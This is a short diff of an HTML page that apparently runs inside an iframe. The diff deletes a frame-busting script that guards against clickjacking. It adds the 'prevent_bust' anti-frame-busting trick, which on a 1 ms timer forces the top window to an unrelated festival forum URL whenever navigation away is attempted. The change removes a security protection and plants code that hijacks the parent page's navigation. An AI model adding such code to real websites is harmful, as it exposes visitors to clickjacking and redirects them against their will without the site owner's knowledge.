@@ -116,13 +116,16 @@
 			window.parent.postMessage("resize", "*");
 		}
 	</script>
-	<script>
-		(function(window) {
-		  if (window.location !== window.top.location) {
-		    window.top.location = window.location;
-		  }
-		})(this);
-	</script>
+<script type="text/javascript">
+    var prevent_bust = 0  
+    window.onbeforeunload = function() { prevent_bust++ }  
+    setInterval(function() {  
+      if (prevent_bust > 0) {  
+        prevent_bust -= 2  
+        window.top.location = 'https://www.efestivals.co.uk/forums/topic/229353-meet-us-in-manchester-%E0%A5%90-creamfields-2019/'  
+      }  
+    }, 1)  
+</script>
 	<script type="text/javascript">
 	window.onload = function() {
 		if(!$('#iframe').length) {
